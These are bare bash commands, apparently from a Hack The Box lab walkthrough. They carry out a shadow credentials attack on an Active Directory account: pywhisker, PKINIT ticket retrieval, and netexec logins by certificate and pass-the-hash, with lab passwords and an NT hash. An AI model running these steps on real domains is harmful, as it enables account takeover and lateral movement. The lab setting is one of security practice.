```bash
pywhisker -d "fluffy.htb" -u "p.agila" -p 'prometheusx-303' --target "winrm_svc" --action add
```

```bash
python3 ~/opt/AD/PKINITtools/gettgtpkinit.py -cert-pfx n0n6HPdf.pfx -pfx-pass SCXgHzlrQWbasQcSM6WW -dc-ip 10.10.11.69 -v fluffy.htb/winrm_svc ticket.ccache
```

```bash
export KRB5CCNAME=$(pwd)/ticket.ccache
```

```bash
netexec smb 10.10.11.69 -u winrm_svc --pfx-cert n0n6HPdf.pfx --pfx-pass 

netexec smb 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```